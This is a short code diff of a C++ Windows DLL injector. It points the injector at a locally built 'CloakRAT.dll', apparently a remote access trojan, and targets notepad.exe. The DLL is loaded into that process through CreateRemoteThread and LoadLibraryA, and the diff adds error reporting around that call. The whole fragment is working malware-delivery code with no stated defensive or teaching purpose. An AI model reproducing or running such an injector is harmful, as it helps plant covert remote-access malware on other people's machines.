@@ -26,8 +26,8 @@ DWORD getProcessIdByName(const char* procName)
 
 int main()
 {
-	const char* dllPath = "FOO";
-	const char* procName = "explorer.exe";
+	const char* dllPath = "C:\\Users\\tal78\\Desktop\\Workspace\\CloakRAT\\Release\\CloakRAT.dll";
+	const char* procName = "notepad.exe";
 
 	DWORD procID = 0;
 	while (!procID) // while the process was not found
@@ -52,8 +52,14 @@ int main()
 		}
 		
 		HANDLE threadHandle = CreateRemoteThread(procHandle, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, dllAddrInRemoteProcess, 0, 0);
-
-		CloseHandle(threadHandle);
+		
+		if (threadHandle == NULL)
+			std::cerr << "Error in CreateRemoteThread(): Err#" << GetLastError();
+		else
+			CloseHandle(threadHandle);
+	}
+	else {
+		std::cerr << "Error!";
 	}
 
 	return 0;
